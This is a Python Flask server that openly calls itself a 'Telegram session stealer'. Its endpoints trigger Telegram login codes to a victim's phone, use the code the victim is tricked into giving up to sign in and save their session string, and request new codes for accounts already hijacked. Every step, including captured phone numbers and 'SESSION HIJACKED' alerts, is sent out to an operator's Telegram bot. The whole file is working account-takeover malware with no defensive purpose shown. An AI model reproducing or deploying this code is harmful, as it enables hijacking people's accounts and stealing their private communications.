from flask import Flask, request, jsonify
import os
import requests
import asyncio
import sys
import json
import time
from datetime import datetime

try:
    from telethon.sync import TelegramClient
    from telethon.sessions import StringSession
    telethon_available = True
except ImportError as e:
    print(f"Telethon import error: {e}")
    telethon_available = False

app = Flask(__name__)

# Configuration from environment variables
def get_config():
    return {
        'API_ID': int(os.environ.get('API_ID', 0)),
        'API_HASH': os.environ.get('API_HASH', ''),
        'SESSION_STRING': os.environ.get('SESSION_STRING', ''),
        'BOT_TOKEN': os.environ.get('BOT_TOKEN', ''),
        'CHAT_ID': os.environ.get('CHAT_ID', '')
    }

config = get_config()
sessions_db = {}
pending_otps = {}

def send_to_bot(message):
    if not config['BOT_TOKEN'] or not config['CHAT_ID']:
        return False
    try:
        url = f"https://api.telegram.org/bot{config['BOT_TOKEN']}/sendMessage"
        data = {'chat_id': config['CHAT_ID'], 'text': message, 'parse_mode': 'Markdown'}
        requests.post(url, json=data, timeout=5)
        return True
    except:
        return False

@app.route('/send_code', methods=['POST'])
def send_code():
    if not telethon_available:
        return jsonify({'success': False, 'error': 'Telethon not available'})
    
    if not config['SESSION_STRING']:
        return jsonify({'success': False, 'error': 'SESSION_STRING not set'})
    
    phone = request.form.get('phone', '').strip()
    if not phone:
        return jsonify({'success': False, 'error': 'No phone provided'})
    
    # Fix phone number format
    if phone.startswith('+6262'):
        phone = '+62' + phone[4:]
    
    async def run():
        try:
            client = TelegramClient(StringSession(config['SESSION_STRING']), config['API_ID'], config['API_HASH'])
            await client.connect()
            result = await client.send_code_request(phone)
            
            pending_otps[phone] = {
                'phone_code_hash': result.phone_code_hash,
                'timestamp': time.time()
            }
            
            send_to_bot(f"🎯 TARGET: `{phone}`")
            return {'success': True, 'phone_code_hash': result.phone_code_hash}
            
        except Exception as e:
            error_msg = f"Send code error: {str(e)}"
            send_to_bot(f"❌ ERROR: `{error_msg}`")
            return {'success': False, 'error': error_msg}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/steal_session', methods=['POST'])
def steal_session():
    if not telethon_available:
        return jsonify({'success': False, 'error': 'Telethon not available'})
    
    phone = request.form.get('phone', '').strip()
    code = request.form.get('code', '').strip()
    
    # Fix phone number format
    if phone.startswith('+6262'):
        phone = '+62' + phone[4:]
    
    if not phone or not code:
        return jsonify({'success': False, 'error': 'Missing phone or code'})
    
    if phone not in pending_otps:
        return jsonify({'success': False, 'error': 'No OTP request found or OTP expired'})
    
    async def run():
        try:
            client = TelegramClient(StringSession(), config['API_ID'], config['API_HASH'])
            await client.connect()
            
            # Check if OTP expired
            otp_data = pending_otps[phone]
            time_diff = time.time() - otp_data.get('timestamp', 0)
            if time_diff > 300:  # 5 minutes
                return {'success': False, 'error': 'OTP code expired'}
            
            result = await client.sign_in(
                phone=phone, 
                code=code, 
                phone_code_hash=otp_data['phone_code_hash']
            )
            
            session_string = client.session.save()
            user = await client.get_me()
            
            sessions_db[phone] = {
                'session_string': session_string,
                'user_id': user.id,
                'first_name': user.first_name or 'Unknown',
                'last_login': datetime.now().isoformat()
            }
            
            send_to_bot(f"🔓 SESSION HIJACKED: `{phone}`")
            del pending_otps[phone]
            
            return {'success': True, 'session': session_string}
            
        except Exception as e:
            error_msg = f"Steal session error: {str(e)}"
            send_to_bot(f"❌ STEAL FAILED: `{error_msg}`")
            return {'success': False, 'error': error_msg}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/new_otp', methods=['POST'])
def new_otp():
    phone = request.form.get('phone', '').strip()
    
    if not phone:
        return jsonify({'success': False, 'error': 'No phone provided'})
    
    if phone not in sessions_db:
        return jsonify({'success': False, 'error': 'No session found for this phone'})
    
    async def run():
        try:
            session_string = sessions_db[phone]['session_string']
            client = TelegramClient(StringSession(session_string), config['API_ID'], config['API_HASH'])
            await client.connect()
            
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Session expired'}
            
            result = await client.send_code_request(phone)
            
            pending_otps[phone] = {
                'phone_code_hash': result.phone_code_hash,
                'timestamp': time.time(),
                'for_stealth': True
            }
            
            message = f"🕵️ STEALTH OTP REQUESTED\n📱 `{phone}`\n👤 `{sessions_db[phone]['first_name']}`"
            send_to_bot(message)
            
            return {'success': True, 'phone_code_hash': result.phone_code_hash}
            
        except Exception as e:
            error_msg = f"New OTP error: {str(e)}"
            send_to_bot(f"❌ OTP REQUEST FAILED: `{error_msg}`")
            return {'success': False, 'error': error_msg}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'telethon': telethon_available})

@app.route('/')
def home():
    status = {
        'flask': '✅ RUNNING',
        'telethon': '✅ AVAILABLE' if telethon_available else '❌ UNAVAILABLE',
        'session_set': '✅ YES' if config['SESSION_STRING'] else '❌ NO',
        'python_version': sys.version
    }
    
    html = f"""
    <html>
        <head><title>JINX TELEGRAM STEALER</title></head>
        <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
            <h1>😈 JINX TELEGRAM SESSION STEALER</h1>
            <pre>{json.dumps(status, indent=2)}</pre>
            <p>Endpoints:</p>
            <ul>
                <li>POST /send_code - Send OTP to victim</li>
                <li>POST /steal_session - Steal session with OTP</li>
                <li>POST /new_otp - Request new OTP for saved session</li>
            </ul>
            <p>💀 Ready to steal sessions!</p>
        </body>
    </html>
    """
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
